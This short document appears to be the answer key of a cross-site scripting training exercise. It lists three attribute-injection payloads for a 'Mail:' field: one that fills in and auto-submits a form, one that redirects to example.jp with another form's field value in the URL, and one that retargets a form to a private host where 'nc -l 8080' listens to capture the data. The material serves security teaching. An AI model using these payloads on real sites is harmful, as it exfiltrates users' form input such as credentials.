## Answer Examples
XSS at "Mail:" textbox.
* ' onmouseover='var a=document.forms[0];var b=document.forms[1];a.elements[0].value="hoge";a.elements[1].value="hoge";a.elements[2].value="hoge";a.elements[3].value=b.elements[0].value;a.submit();
* ' onmouseover='document.location="http://example.jp/bbs.cgi?author=a&email=a&title=a&body="+document.forms[1].elements[0].value
* ' onmouseover='document.forms[1].action="http://192.168.x.x:8080/"
    * "nc -l 8080" at 192.168.x.x
